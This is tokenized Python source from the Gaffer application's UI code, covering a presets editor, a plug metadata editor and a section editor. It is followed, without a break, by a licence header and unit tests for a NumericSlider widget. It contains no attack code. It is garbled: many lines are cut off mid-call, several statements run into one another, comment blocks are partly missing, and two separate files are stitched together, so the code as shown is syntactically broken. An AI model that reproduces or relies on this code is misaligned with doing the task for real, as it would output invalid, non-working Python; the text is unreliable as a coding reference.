self . __pathListingSelectionChangedConnection = self . __pathListing . selectionChangedSignal ( ) . connect self . __dragEnterConnection = self . __pathListing . dragEnterSignal ( ) . connect ( Gaffer . WeakMethod ( self self . __dragMoveConnection = self . __pathListing . dragMoveSignal ( ) . connect ( Gaffer . WeakMethod ( self self . __dragEndConnection = self . __pathListing . dragEndSignal ( ) . connect ( Gaffer . WeakMethod ( self . __dragEnd \n 
with GafferUI . ListContainer ( GafferUI . ListContainer . Orientation . Horizontal , spacing = 4 ) : \n 
\n 
~~~ self . __addButton = GafferUI . Button ( image = "plus.png" , hasFrame = False ) \n 
self . __addButtonClickedConnection = self . __addButton . clickedSignal ( ) . connect ( Gaffer . WeakMethod \n 
self . __deleteButton = GafferUI . Button ( image = "minus.png" , hasFrame = False ) \n 
self . __deleteButtonClickedConnection = self . __deleteButton . clickedSignal ( ) . connect ( Gaffer . WeakMethod \n 
~~ ~~ with GafferUI . ListContainer ( spacing = 4 ) as self . __editingColumn : \n 
\n 
~~~ GafferUI . Label ( "Name" ) \n 
\n 
self . __nameWidget = GafferUI . TextWidget ( ) \n 
self . __nameEditingFinishedConnection = self . __nameWidget . editingFinishedSignal ( ) . connect ( Gaffer \n 
GafferUI . Spacer ( IECore . V2i ( 4 ) , maximumSize = IECore . V2i ( 4 ) ) \n 
\n 
GafferUI . Label ( "Value" ) \n 
\n 
# We make a UI for editing preset values by copying the plug \n 
# onto this node and then making a PlugValueWidget for it. \n 
~~ ~~ self . __valueNode = Gaffer . Node ( "PresetEditor" ) \n 
self . __valuePlugSetConnection = self . __valueNode . plugSetSignal ( ) . connect ( Gaffer . WeakMethod ( self . \n 
~~ def setPlug ( self , plug ) : \n 
\n 
~~~ self . __plug = plug \n 
\n 
self . __plugMetadataChangedConnection = None \n 
del self . __editingColumn [ 4 : ] \n 
\n 
plugValueWidget = None \n 
if self . __plug is not None : \n 
~~~ self . __plugMetadataChangedConnection = Gaffer . Metadata . plugValueChangedSignal ( ) . connect ( Gaffer . WeakMethod self . __valueNode [ "presetValue" ] = plug . createCounterpart ( "presetValue" , plug . Direction . In ) \n 
if hasattr ( self . __plug , "getValue" ) : \n 
~~~ plugValueWidget = GafferUI . PlugValueWidget . create ( self . __valueNode [ "presetValue" ] , useTypeOnly \n 
~~ ~~ self . __editingColumn . append ( plugValueWidget if plugValueWidget is not None else GafferUI . TextWidget \n 
self . __editingColumn . append ( GafferUI . Spacer ( IECore . V2i ( 0 ) , parenting = { "expand" : True } ) ) \n 
self . __updatePath ( ) \n 
\n 
self . __addButton . setEnabled ( hasattr ( self . __plug , "getValue" ) ) \n 
\n 
~~ def getPlug ( self ) : \n 
\n 
~~~ return self . __plug \n 
\n 
~~ def __updatePath ( self ) : \n 
\n 
~~~ d = self . __pathListing . getPath ( ) . dict ( ) \n 
d . clear ( ) \n 
if self . __plug is not None : \n 
~~~ for name in _registeredMetadata ( self . __plug , instanceOnly = True , persistentOnly = True ) : \n 
~~~ if name . startswith ( "preset:" ) : \n 
~~~ d [ name [ 7 : ] ] = _metadata ( self . __plug , name ) \n 
\n 
~~ ~~ ~~ self . __pathListing . getPath ( ) . pathChangedSignal ( ) ( self . __pathListing . getPath ( ) ) \n 
\n 
~~ def __plugMetadataChanged ( self , nodeTypeId , plugPath , key , plug ) : \n 
\n 
~~~ if plug is None or not plug . isSame ( self . __plug ) : \n 
~~~ return \n 
\n 
~~ if key . startswith ( "preset:" ) : \n 
~~~ self . __updatePath ( ) \n 
\n 
~~ ~~ def __selectionChanged ( self , listing ) : \n 
\n 
~~~ selectedPaths = listing . getSelectedPaths ( ) \n 
\n 
self . __nameWidget . setText ( selectedPaths [ 0 ] [ 0 ] if selectedPaths else "" ) \n 
if selectedPaths : \n 
~~~ with Gaffer . BlockedConnection ( self . __valuePlugSetConnection ) : \n 
~~~ self . __valueNode [ "presetValue" ] . setValue ( \n 
Gaffer . Metadata . plugValue ( self . getPlug ( ) , "preset:" + selectedPaths [ 0 ] [ 0 ] ) \n 
) \n 
\n 
~~ ~~ self . __editingColumn . setEnabled ( bool ( selectedPaths ) ) \n 
self . __deleteButton . setEnabled ( bool ( selectedPaths ) ) \n 
\n 
~~ def __dragEnter ( self , listing , event ) : \n 
\n 
~~~ if event . sourceWidget is not self . __pathListing : \n 
~~~ return False \n 
~~ if not isinstance ( event . data , IECore . StringVectorData ) : \n 
~~~ return False \n 
\n 
~~ return True \n 
\n 
~~ def __dragMove ( self , listing , event ) : \n 
\n 
~~~ d = self . __pathListing . getPath ( ) . dict ( ) \n 
\n 
srcPath = self . __pathListing . getPath ( ) . copy ( ) . setFromString ( event . data [ 0 ] ) \n 
srcIndex = d . keys ( ) . index ( srcPath [ 0 ] ) \n 
\n 
targetPath = self . __pathListing . pathAt ( event . line . p0 ) \n 
if targetPath is not None : \n 
~~~ targetIndex = d . keys ( ) . index ( targetPath [ 0 ] ) \n 
~~ else : \n 
~~~ targetIndex = 0 if event . line . p0 . y < 1 else len ( d ) \n 
\n 
~~ if srcIndex == targetIndex : \n 
~~~ return True \n 
\n 
~~ items = d . items ( ) \n 
item = items [ srcIndex ] \n 
del items [ srcIndex ] \n 
items . insert ( targetIndex , item ) \n 
\n 
d . clear ( ) \n 
d . update ( items ) \n 
\n 
self . __pathListing . getPath ( ) . pathChangedSignal ( ) ( self . __pathListing . getPath ( ) ) \n 
\n 
return True \n 
\n 
~~ def __dragEnd ( self , listing , event ) : \n 
\n 
~~~ d = self . __pathListing . getPath ( ) . dict ( ) \n 
with Gaffer . BlockedConnection ( self . __plugMetadataChangedConnection ) : \n 
~~~ with Gaffer . UndoContext ( self . getPlug ( ) . ancestor ( Gaffer . ScriptNode ) ) : \n 
# reorder by removing everything and reregistering in the order we want \n 
~~~ for item in d . items ( ) : \n 
~~~ Gaffer . Metadata . deregisterPlugValue ( self . getPlug ( ) , "preset:" + item [ 0 ] ) \n 
~~ for item in d . items ( ) : \n 
~~~ Gaffer . Metadata . registerPlugValue ( self . getPlug ( ) , "preset:" + item [ 0 ] , item [ 1 ] ) \n 
\n 
~~ ~~ ~~ self . __updatePath ( ) \n 
\n 
return True \n 
\n 
~~ def __addButtonClicked ( self , button ) : \n 
\n 
~~~ existingNames = [ p [ 0 ] for p in self . __pathListing . getPath ( ) . children ( ) ] \n 
\n 
name = "New Preset" \n 
index = 1 \n 
while name in existingNames : \n 
~~~ name = "New Preset %d" % index \n 
index += 1 \n 
\n 
~~ with Gaffer . UndoContext ( self . __plug . ancestor ( Gaffer . ScriptNode ) ) : \n 
~~~ Gaffer . Metadata . registerPlugValue ( self . __plug , "preset:" + name , self . __plug . getValue ( ) ) \n 
\n 
~~ self . __pathListing . setSelectedPaths ( \n 
self . __pathListing . getPath ( ) . copy ( ) . setFromString ( "/" + name ) \n 
) \n 
\n 
self . __nameWidget . grabFocus ( ) \n 
self . __nameWidget . setSelection ( 0 , len ( name ) ) \n 
\n 
return True \n 
\n 
~~ def __deleteButtonClicked ( self , button ) : \n 
\n 
~~~ paths = self . __pathListing . getPath ( ) . children ( ) \n 
selectedPreset = self . __pathListing . getSelectedPaths ( ) [ 0 ] [ 0 ] \n 
selectedIndex = [ p [ 0 ] for p in paths ] . index ( selectedPreset ) \n 
\n 
with Gaffer . UndoContext ( self . __plug . ancestor ( Gaffer . ScriptNode ) ) : \n 
~~~ Gaffer . Metadata . deregisterPlugValue ( self . __plug , "preset:" + selectedPreset ) \n 
\n 
~~ del paths [ selectedIndex ] \n 
if len ( paths ) : \n 
~~~ self . __pathListing . setSelectedPaths ( [ paths [ min ( selectedIndex , len ( paths ) - 1 ) ] ] ) \n 
\n 
~~ return True \n 
\n 
~~ def __nameEditingFinished ( self , nameWidget ) : \n 
\n 
~~~ selectedPaths = self . __pathListing . getSelectedPaths ( ) \n 
if not len ( selectedPaths ) : \n 
~~~ return True \n 
\n 
~~ oldName = selectedPaths [ 0 ] [ 0 ] \n 
newName = nameWidget . getText ( ) \n 
\n 
items = self . __pathListing . getPath ( ) . dict ( ) . items ( ) \n 
with Gaffer . BlockedConnection ( self . __plugMetadataChangedConnection ) : \n 
~~~ with Gaffer . UndoContext ( self . getPlug ( ) . ancestor ( Gaffer . ScriptNode ) ) : \n 
# retain order by removing and reregistering everything \n 
~~~ for item in items : \n 
~~~ Gaffer . Metadata . deregisterPlugValue ( self . getPlug ( ) , "preset:" + item [ 0 ] ) \n 
~~ for item in items : \n 
~~~ Gaffer . Metadata . registerPlugValue ( self . getPlug ( ) , "preset:" + ( item [ 0 ] if item [ 0 ] != oldName else \n 
~~ ~~ ~~ self . __updatePath ( ) \n 
self . __pathListing . setSelectedPaths ( [ self . __pathListing . getPath ( ) . copy ( ) . setFromString ( "/" + newName \n 
return True \n 
\n 
~~ def __valuePlugSet ( self , plug ) : \n 
\n 
~~~ if not plug . isSame ( self . __valueNode [ "presetValue" ] ) : \n 
~~~ return \n 
\n 
~~ selectedPaths = self . __pathListing . getSelectedPaths ( ) \n 
preset = selectedPaths [ 0 ] [ 0 ] \n 
\n 
with Gaffer . UndoContext ( self . getPlug ( ) . ancestor ( Gaffer . ScriptNode ) ) : \n 
~~~ Gaffer . Metadata . registerPlugValue ( self . getPlug ( ) , "preset:" + preset , plug . getValue ( ) ) \n 
\n 
########################################################################## \n 
\n 
# description, etc. \n 
########################################################################## \n 
\n 
~~ ~~ ~~ class _PlugEditor ( GafferUI . Widget ) : \n 
\n 
~~~ def __init__ ( self , parenting = None ) : \n 
\n 
~~~ scrolledContainer = GafferUI . ScrolledContainer ( horizontalMode = GafferUI . ScrolledContainer . ScrollMode GafferUI . Widget . __init__ ( self , scrolledContainer , parenting = parenting ) \n 
\n 
self . __metadataWidgets = { } \n 
\n 
scrolledContainer . setChild ( GafferUI . ListContainer ( spacing = 4 ) ) \n 
with scrolledContainer . getChild ( ) : \n 
\n 
~~~ with _Row ( ) : \n 
\n 
~~~ _Label ( "Name" ) \n 
\n 
self . __nameWidget = GafferUI . NameWidget ( None ) \n 
\n 
~~ with _Row ( ) : \n 
\n 
~~~ _Label ( "Label" ) \n 
self . __metadataWidgets [ "label" ] = _StringMetadataWidget ( key = "label" , acceptEmptyString = False \n 
~~ with _Row ( ) : \n 
\n 
~~~ _Label ( "Description" , parenting = { "verticalAlignment" : GafferUI . ListContainer . VerticalAlignment self . __metadataWidgets [ "description" ] = _MultiLineStringMetadataWidget ( key = "description" ) \n 
self . __metadataWidgets [ "description" ] . textWidget ( ) . setFixedLineHeight ( 10 ) \n 
\n 
~~ with _Row ( ) : \n 
\n 
~~~ _Label ( "Widget" ) \n 
\n 
self . __widgetMenu = GafferUI . MenuButton ( \n 
menu = GafferUI . Menu ( Gaffer . WeakMethod ( self . __widgetMenuDefinition ) ) \n 
) \n 
\n 
~~ with GafferUI . Collapsible ( "Presets" , collapsed = True ) : \n 
\n 
~~~ with _Row ( ) : \n 
\n 
~~~ _Label ( "" ) \n 
self . __presetsEditor = _PresetsEditor ( ) \n 
\n 
~~ ~~ with GafferUI . Collapsible ( "Widget Settings" , collapsed = True ) : \n 
\n 
~~~ with GafferUI . ListContainer ( spacing = 4 ) : \n 
\n 
~~~ with _Row ( ) : \n 
\n 
~~~ _Label ( "Divider" ) \n 
self . __metadataWidgets [ "divider" ] = _BoolMetadataWidget ( key = "divider" ) \n 
\n 
~~ for m in self . __metadataDefinitions : \n 
\n 
~~~ with _Row ( ) : \n 
~~~ _Label ( m . label ) \n 
self . __metadataWidgets [ m . key ] = m . metadataWidgetType ( key = m . key ) \n 
\n 
~~ ~~ ~~ ~~ with GafferUI . Collapsible ( "Node Graph" , collapsed = True ) : \n 
\n 
~~~ with GafferUI . ListContainer ( spacing = 4 ) as self . __nodeGraphSection : \n 
\n 
~~~ with _Row ( ) : \n 
\n 
~~~ _Label ( "Gadget" ) \n 
self . __gadgetMenu = GafferUI . MenuButton ( \n 
menu = GafferUI . Menu ( Gaffer . WeakMethod ( self . __gadgetMenuDefinition ) ) \n 
) \n 
\n 
~~ with _Row ( ) : \n 
\n 
~~~ _Label ( "Position" ) \n 
self . __metadataWidgets [ "nodeGadget:nodulePosition" ] = _MenuMetadataWidget ( \n 
key = "nodeGadget:nodulePosition" , \n 
labelsAndValues = [ \n 
( "Default" , None ) , \n 
( "Top" , "top" ) , \n 
( "Bottom" , "bottom" ) , \n 
( "Left" , "left" ) , \n 
( "Right" , "right" ) , \n 
] \n 
) \n 
\n 
~~ with _Row ( ) : \n 
\n 
~~~ _Label ( "Color" ) \n 
self . __metadataWidgets [ "nodule:color" ] = _ColorSwatchMetadataWidget ( key = "nodule:color" ) \n 
\n 
~~ with _Row ( ) : \n 
\n 
~~~ _Label ( "Connection Color" ) \n 
self . __metadataWidgets [ "connectionGadget:color" ] = _ColorSwatchMetadataWidget ( key = "connectionGadget:color" \n 
~~ ~~ ~~ GafferUI . Spacer ( IECore . V2i ( 0 ) , parenting = { "expand" : True } ) \n 
\n 
~~ self . __plugMetadataChangedConnection = Gaffer . Metadata . plugValueChangedSignal ( ) . connect ( Gaffer . WeakMethod \n 
self . __plug = None \n 
\n 
~~ def setPlug ( self , plug ) : \n 
\n 
~~~ self . __plug = plug \n 
\n 
self . __nameWidget . setGraphComponent ( self . __plug ) \n 
for widget in self . __metadataWidgets . values ( ) : \n 
~~~ widget . setTarget ( self . __plug ) \n 
\n 
~~ self . __updateWidgetMenuText ( ) \n 
self . __updateWidgetSettings ( ) \n 
self . __updateGadgetMenuText ( ) \n 
self . __presetsEditor . setPlug ( plug ) \n 
self . __nodeGraphSection . setEnabled ( self . __plug is not None and self . __plug . parent ( ) . isSame ( self . \n 
self . setEnabled ( self . __plug is not None ) \n 
\n 
~~ def getPlug ( self ) : \n 
\n 
~~~ return self . __plug \n 
\n 
~~ def __plugMetadataChanged ( self , nodeTypeId , plugPath , key , plug ) : \n 
\n 
~~~ if self . getPlug ( ) is None : \n 
~~~ return \n 
\n 
~~ if plug is not None and not plug . isSame ( self . getPlug ( ) ) : \n 
~~~ return \n 
\n 
~~ if not self . getPlug ( ) . node ( ) . isInstanceOf ( nodeTypeId ) : \n 
~~~ return \n 
\n 
~~ if key == "plugValueWidget:type" : \n 
~~~ self . __updateWidgetMenuText ( ) \n 
self . __updateWidgetSettings ( ) \n 
~~ elif key == "nodule:type" : \n 
~~~ self . __updateGadgetMenuText ( ) \n 
\n 
~~ ~~ def __updateWidgetMenuText ( self ) : \n 
\n 
~~~ if self . getPlug ( ) is None : \n 
~~~ self . __widgetMenu . setText ( "" ) \n 
return \n 
\n 
~~ metadata = Gaffer . Metadata . plugValue ( self . getPlug ( ) , "plugValueWidget:type" ) \n 
for w in self . __widgetDefinitions : \n 
~~~ if w . metadata == metadata : \n 
~~~ self . __widgetMenu . setText ( w . label ) \n 
return \n 
\n 
~~ ~~ self . __widgetMenu . setText ( metadata ) \n 
\n 
~~ def __updateWidgetSettings ( self ) : \n 
\n 
~~~ widgetType = None \n 
if self . getPlug ( ) is not None : \n 
~~~ widgetType = Gaffer . Metadata . plugValue ( self . getPlug ( ) , "plugValueWidget:type" ) \n 
\n 
~~ for m in self . __metadataDefinitions : \n 
~~~ widget = self . __metadataWidgets [ m . key ] \n 
widget . parent ( ) . setEnabled ( m . plugValueWidgetType == widgetType ) \n 
\n 
~~ self . __metadataWidgets [ "connectionGadget:color" ] . parent ( ) . setEnabled ( \n 
self . getPlug ( ) is not None and self . getPlug ( ) . direction ( ) == Gaffer . Plug . Direction . In \n 
) \n 
\n 
~~ def __widgetMenuDefinition ( self ) : \n 
\n 
~~~ result = IECore . MenuDefinition ( ) \n 
if self . getPlug ( ) is None : \n 
~~~ return result \n 
\n 
~~ metadata = Gaffer . Metadata . plugValue ( self . getPlug ( ) , "plugValueWidget:type" ) \n 
for w in self . __widgetDefinitions : \n 
~~~ if not isinstance ( self . getPlug ( ) , w . plugType ) : \n 
~~~ continue \n 
\n 
~~ result . append ( \n 
"/" + w . label , \n 
{ \n 
"command" : functools . partial ( Gaffer . WeakMethod ( self . __registerOrDeregisterMetadata ) , key = "checkBox" : metadata == w . metadata , \n 
} \n 
) \n 
\n 
~~ return result \n 
\n 
~~ def __updateGadgetMenuText ( self ) : \n 
\n 
~~~ if self . getPlug ( ) is None : \n 
~~~ self . __gadgetMenu . setText ( "" ) \n 
return \n 
\n 
~~ metadata = Gaffer . Metadata . plugValue ( self . getPlug ( ) , "nodule:type" ) \n 
metadata = None if metadata == "GafferUI::StandardNodule" else metadata \n 
for g in self . __gadgetDefinitions : \n 
~~~ if g . metadata == metadata : \n 
~~~ self . __gadgetMenu . setText ( g . label ) \n 
return \n 
\n 
~~ ~~ self . __gadgetMenu . setText ( metadata ) \n 
\n 
~~ def __gadgetMenuDefinition ( self ) : \n 
\n 
~~~ result = IECore . MenuDefinition ( ) \n 
if self . getPlug ( ) is None : \n 
~~~ return result \n 
\n 
~~ metadata = Gaffer . Metadata . plugValue ( self . getPlug ( ) , "nodule:type" ) \n 
for g in self . __gadgetDefinitions : \n 
~~~ if not isinstance ( self . getPlug ( ) , g . plugType ) : \n 
~~~ continue \n 
\n 
~~ result . append ( \n 
"/" + g . label , \n 
{ \n 
"command" : functools . partial ( Gaffer . WeakMethod ( self . __registerOrDeregisterMetadata ) , key = "checkBox" : metadata == g . metadata , \n 
} \n 
) \n 
\n 
~~ return result \n 
\n 
~~ def __registerOrDeregisterMetadata ( self , unused , key , value ) : \n 
\n 
~~~ with Gaffer . UndoContext ( self . getPlug ( ) . ancestor ( Gaffer . ScriptNode ) ) : \n 
~~~ if value is not None : \n 
~~~ Gaffer . Metadata . registerPlugValue ( self . getPlug ( ) , key , value ) \n 
~~ else : \n 
~~~ Gaffer . Metadata . deregisterPlugValue ( self . getPlug ( ) , key ) \n 
\n 
~~ ~~ ~~ __WidgetDefinition = collections . namedtuple ( "WidgetDefinition" , ( "label" , "plugType" , "metadata" __widgetDefinitions = ( \n 
__WidgetDefinition ( "Default" , Gaffer . Plug , None ) , \n 
__WidgetDefinition ( "Checkbox" , Gaffer . IntPlug , "GafferUI.BoolPlugValueWidget" ) , \n 
__WidgetDefinition ( "Text Region" , Gaffer . StringPlug , "GafferUI.MultiLineStringPlugValueWidget" ) , __WidgetDefinition ( "File Chooser" , Gaffer . StringPlug , "GafferUI.FileSystemPathPlugValueWidget" ) , __WidgetDefinition ( "Presets Menu" , Gaffer . ValuePlug , "GafferUI.PresetsPlugValueWidget" ) , \n 
__WidgetDefinition ( "Connection" , Gaffer . Plug , "GafferUI.ConnectionPlugValueWidget" ) , \n 
__WidgetDefinition ( "None" , Gaffer . Plug , "" ) , \n 
) \n 
\n 
__MetadataDefinition = collections . namedtuple ( "MetadataDefinition" , ( "key" , "label" , "metadataWidgetType" __metadataDefinitions = ( \n 
__MetadataDefinition ( "fileSystemPathPlugValueWidget:extensions" , "File Extensions" , _StringMetadataWidget __MetadataDefinition ( "pathPlugValueWidget:bookmarks" , "Bookmarks Category" , _StringMetadataWidget __MetadataDefinition ( "pathPlugValueWidget:valid" , "File Must Exist" , _BoolMetadataWidget , "GafferUI.FileSystemPathPlugValueWidget" __MetadataDefinition ( "pathPlugValueWidget:leaf" , "No Directories" , _BoolMetadataWidget , "GafferUI.FileSystemPathPlugValueWidget" __MetadataDefinition ( "fileSystemPathPlugValueWidget:includeSequences" , "Allow sequences" , _BoolMetadataWidget # Note that includeSequenceFrameRange is primarily used by GafferCortex. \n 
# Think twice before using it elsewhere\tas it may not exist in the future. \n 
__MetadataDefinition ( "fileSystemPathPlugValueWidget:includeSequenceFrameRange" , "Sequences include frame range" ) \n 
\n 
__GadgetDefinition = collections . namedtuple ( "GadgetDefinition" , ( "label" , "plugType" , "metadata" __gadgetDefinitions = ( \n 
__GadgetDefinition ( "Default" , Gaffer . Plug , None ) , \n 
__GadgetDefinition ( "Array" , Gaffer . ArrayPlug , "GafferUI::CompoundNodule" ) , \n 
__GadgetDefinition ( "None" , Gaffer . Plug , "" ) , \n 
) \n 
\n 
########################################################################## \n 
# _SectionEditor. This provides a panel for editing the details of \n 
# a specific section. \n 
########################################################################## \n 
\n 
~~ class _SectionEditor ( GafferUI . Widget ) : \n 
\n 
~~~ def __init__ ( self , parenting = None ) : \n 
\n 
~~~ column = GafferUI . ListContainer ( spacing = 4 , borderWidth = 8 ) \n 
GafferUI . Widget . __init__ ( self , column , parenting = parenting ) \n 
\n 
with column : \n 
\n 
~~~ with _Row ( ) : \n 
\n 
~~~ _Label ( "Name" ) \n 
\n 
self . __nameWidget = GafferUI . TextWidget ( ) \n 
self . __nameWidgetEditingFinishedConnection = self . __nameWidget . editingFinishedSignal ( ) . connect ( \n 
~~ with _Row ( ) : \n 
\n 
~~~ _Label ( "Summary" , parenting = { "verticalAlignment" : GafferUI . ListContainer . VerticalAlignment . \n 
self . __summaryMetadataWidget = _MultiLineStringMetadataWidget ( key = "" ) \n 
\n 
~~ ~~ self . __section = "" \n 
self . __plugParent = None \n 
self . __nameChangedSignal = Gaffer . Signal3 ( ) \n 
\n 
~~ def setPlugParent ( self , plugParent ) : \n 
\n 
~~~ self . __plugParent = plugParent \n 
self . __summaryMetadataWidget . setTarget ( self . __plugParent ) \n 
\n 
~~ def getPlugParent ( self ) : \n 
\n 
~~~ return self . __plugParent \n 
\n 
~~ def setSection ( self , section ) : \n 
\n 
~~~ assert ( isinstance ( section , basestring ) ) \n 
\n 
self . __section = section \n 
self . __nameWidget . setText ( section . rpartition ( "." ) [ - 1 ] ) \n 
self . __summaryMetadataWidget . setKey ( "layout:section:" + self . __section + ":summary" ) \n 
\n 
~~ def getSection ( self ) : \n 
\n 
~~~ return self . __section \n 
\n 
~~ def nameChangedSignal ( self ) : \n 
\n 
~~~ return self . __nameChangedSignal \n 
\n 
~~ def __nameWidgetEditingFinished ( self , nameWidget ) : \n 
\n 
~~~ if nameWidget . getText ( ) == "" : \n 
\n 
~~~ self . setSection ( self . __section ) \n 
return \n 
\n 
~~ oldSectionPath = self . __section . split ( "." ) \n 
newSectionPath = oldSectionPath [ : ] \n 
newSectionPath [ - 1 ] = nameWidget . getText ( ) . replace ( "." , "" ) \n 
\n 
if oldSectionPath == newSectionPath : \n 
~~~ return \n 
\n 
~~ def newSection ( oldSection ) : \n 
\n 
~~~ s = oldSection . split ( "." ) \n 
if s [ : len ( oldSectionPath ) ] == oldSectionPath : \n 
~~~ s [ : len ( oldSectionPath ) ] = newSectionPath \n 
return "." . join ( s ) \n 
~~ else : \n 
~~~ return oldSection \n 
\n 
~~ ~~ with Gaffer . UndoContext ( self . __plugParent . ancestor ( Gaffer . ScriptNode ) ) : \n 
\n 
~~~ for plug in self . __plugParent . children ( Gaffer . Plug ) : \n 
~~~ s = _metadata ( plug , "layout:section" ) \n 
if s is not None : \n 
~~~ _registerMetadata ( plug , "layout:section" , newSection ( s ) ) \n 
\n 
~~ ~~ emptySections = _metadata ( self . getPlugParent ( ) , "uiEditor:emptySections" ) \n 
if emptySections : \n 
~~~ for i in range ( 0 , len ( emptySections ) ) : \n 
~~~ emptySections [ i ] = newSection ( emptySections [ i ] ) \n 
~~ _registerMetadata ( self . getPlugParent ( ) , "uiEditor:emptySections" , emptySections ) \n 
\n 
~~ for name in _registeredMetadata ( self . getPlugParent ( ) , instanceOnly = True , persistentOnly = True ~~~ m = re . match ( "(layout:section:)(.*)(:.*)" , name ) \n 
if m : \n 
~~~ if newSection ( m . group ( 2 ) ) != m . group ( 2 ) : \n 
~~~ _registerMetadata ( \n 
self . getPlugParent ( ) , \n 
m . group ( 1 ) + newSection ( m . group ( 2 ) ) + m . group ( 3 ) , \n 
_metadata ( self . getPlugParent ( ) , name ) \n 
) \n 
_deregisterMetadata ( self . getPlugParent ( ) , name ) \n 
\n 
~~ ~~ ~~ ~~ self . setSection ( "." . join ( newSectionPath ) ) \n 
self . nameChangedSignal ( ) ( self , "." . join ( oldSectionPath ) , "." . join ( newSectionPath ) ) \n 
\n 
# Metadata utility methods. \n 
# \\todo We should change the Metadata API to provide overloads \n 
\n 
# do this hoop jumping ourselves. \n 
########################################################################## \n 
\n 
~~ ~~ def _registerMetadata ( target , name , value ) : \n 
\n 
~~~ if isinstance ( target , Gaffer . Node ) : \n 
~~~ Gaffer . Metadata . registerNodeValue ( target , name , value ) \n 
~~ else : \n 
~~~ Gaffer . Metadata . registerPlugValue ( target , name , value ) \n 
\n 
~~ ~~ def _registeredMetadata ( target , inherit = True , instanceOnly = False , persistentOnly = False ) : \n 
\n 
~~~ if isinstance ( target , Gaffer . Node ) : \n 
~~~ return Gaffer . Metadata . registeredNodeValues ( target , inherit , instanceOnly , persistentOnly ) \n 
~~ else : \n 
~~~ return Gaffer . Metadata . registeredPlugValues ( target , inherit , instanceOnly , persistentOnly ) \n 
\n 
~~ ~~ def _metadata ( target , name ) : \n 
\n 
~~~ if isinstance ( target , Gaffer . Node ) : \n 
~~~ return Gaffer . Metadata . nodeValue ( target , name ) \n 
~~ else : \n 
~~~ return Gaffer . Metadata . plugValue ( target , name ) \n 
\n 
~~ ~~ def _deregisterMetadata ( target , name ) : \n 
\n 
~~~ if isinstance ( target , Gaffer . Node ) : \n 
~~~ return Gaffer . Metadata . deregisterNodeValue ( target , name ) \n 
~~ else : \n 
~~~ return Gaffer . Metadata . deregisterPlugValue ( target , name ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2012, John Haddon. All rights reserved. \n 
#  Copyright (c) 2013, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
~~ ~~ import unittest \n 
\n 
import GafferTest \n 
import GafferUI \n 
\n 
class NumericSliderTest ( unittest . TestCase ) : \n 
\n 
~~~ def testConstruction ( self ) : \n 
\n 
~~~ s = GafferUI . NumericSlider ( value = 0 , min = 0 , max = 1 ) \n 
\n 
self . assertEqual ( s . getPosition ( ) , 0 ) \n 
self . assertEqual ( s . getValue ( ) , 0 ) \n 
self . assertEqual ( s . getRange ( ) , ( 0 , 1 , 0 , 1 ) ) \n 
\n 
~~ def testSetValue ( self ) : \n 
\n 
~~~ s = GafferUI . NumericSlider ( value = 0 , min = 0 , max = 2 ) \n 
\n 
self . assertEqual ( s . getPosition ( ) , 0 ) \n 
self . assertEqual ( s . getValue ( ) , 0 ) \n 
\n 
s . setValue ( 0.5 ) \n 
self . assertEqual ( s . getPosition ( ) , 0.25 ) \n 
self . assertEqual ( s . getValue ( ) , 0.5 ) \n 
\n 
~~ def testSetRange ( self ) : \n 
\n 
~~~ s = GafferUI . NumericSlider ( value = 1 , min = 0 , max = 2 ) \n 
\n 
self . assertEqual ( s . getPosition ( ) , 0.5 ) \n 
self . assertEqual ( s . getValue ( ) , 1 ) \n 
\n 
s . setRange ( 0 , 1 ) \n 
self . assertEqual ( s . getPosition ( ) , 1 ) \n 
self . assertEqual ( s . getValue ( ) , 1 ) \n 
\n 
~~ def testSetZeroRange ( self ) : \n 
\n 
~~~ s = GafferUI . NumericSlider ( value = 1 , min = 1 , max = 2 ) \n 
\n 
self . assertEqual ( s . getPosition ( ) , 0 ) \n 
self . assertEqual ( s . getValue ( ) , 1 ) \n 
\n 
s . setRange ( 1 , 1 ) \n 
self . assertEqual ( s . getValue ( ) , 1 ) \n 
\n 
~~ def testSetPosition ( self ) : \n 
\n 
~~~ s = GafferUI . NumericSlider ( value = 0 , min = 0 , max = 2 ) \n 
\n 
self . assertEqual ( s . getPosition ( ) , 0 ) \n 
self . assertEqual ( s . getValue ( ) , 0 ) \n 
\n 
s . setPosition ( 0.5 ) \n 
self . assertEqual ( s . getPosition ( ) , 0.5 ) \n 
self . assertEqual ( s . getValue ( ) , 1 ) \n 
\n 
~~ def testValuesOutsideRangeAreClamped ( self ) : \n 
\n 
~~~ s = GafferUI . NumericSlider ( value = 0.1 , min = 0 , max = 2 ) \n 
\n 
cs = GafferTest . CapturingSlot ( s . valueChangedSignal ( ) , s . positionChangedSignal ( ) ) \n 
\n 
s . setValue ( 3 ) \n 
self . assertEqual ( s . getValue ( ) , 2 ) \n 
self . assertEqual ( s . getPosition ( ) , 1 ) \n 
